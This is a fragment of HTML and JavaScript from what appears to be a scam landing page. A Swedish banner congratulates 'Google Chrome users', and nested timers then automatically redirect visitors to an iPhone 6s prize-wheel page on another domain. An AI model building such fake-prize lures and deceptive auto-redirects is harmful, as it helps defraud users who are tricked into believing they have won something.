...
<body class="page1">
		...
		<div class="row-fluid">
			<div class="container">
				<h2 class="text-center lato" style="color: #444444"><div id="userBrowser"><img class="userBrowserImg" src="//landing.quizawards.com/assets/lucky_wheel_qn/images/chrome.png?v=1449487455"/> Grattis Google Chrome användare</div></h2>
			</div>
                      ...
                      setTimeout(function(){
                          ...
                          setTimeout(function(){
					          ...
					          // //$('.brand').hide();
					          		...
					          		//setTimeout(function(){
					          			window.location.href = 'http://ozvisions.com/iphone6s_white_qn_wheel/se?s';
					          		//},3500)
							},3800);
                      }, 8000);
            }  
